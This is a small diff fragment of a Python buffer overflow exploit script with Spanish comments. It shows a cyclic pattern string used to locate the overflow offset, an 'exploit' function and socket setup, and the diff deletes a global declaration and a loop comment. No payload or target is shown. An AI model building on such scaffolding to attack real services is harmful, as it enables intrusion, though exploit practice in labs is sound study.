@@ -15,10 +15,6 @@ offset="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3
 
 # Declarar la función exploit
 def exploit():
-    global offset  # Declarar total_length como global
-
-    # Bucle principal para enviar solicitudes al servicio
-    
     
     # Crear un nuevo socket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
